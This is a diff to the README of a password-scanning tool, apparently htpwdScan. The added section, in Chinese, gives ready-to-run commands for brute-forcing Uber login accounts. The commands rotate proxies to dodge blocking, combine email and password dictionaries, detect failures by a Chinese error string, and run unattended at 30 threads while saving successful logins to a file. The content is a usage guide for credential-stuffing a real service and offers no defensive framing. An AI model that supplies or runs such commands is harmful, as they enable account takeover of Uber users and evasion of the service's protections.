@@ -1,3 +1,20 @@
+uber login scan
+====
+* 调试
+  	>python htpwdScan.py -proxylist=proxylist.txt  -f=uber.txt -https -t=1 -d email=dict/pinyin2.txt password=dict/password.txt -err="电子信箱或密码无效" -debug
+	
+	>-proxylist=proxylist.txt,指定代理列表
+	>-f=uber.txt 手动从 login页面抓取 request header 和 formdata	
+	>email和password  指定用户名密码文件
+	>-err="电子信箱或密码无效" ，response中存在此字符串视为登录失败
+        >-t=1 单线程
+
+* 无人值守扫描
+	>python htpwdScan.py -proxylist=proxylist.txt  -f=uber.txt -https -t=30 -d email=dict/pinyin2.txt password=dict/password.txt -suc="***" -o=uber_success.txt
+	
+        >-suc="***" -o=uber_success.txt  只保留登录成功的信息
+
+
 htpwdScan
 ====
 
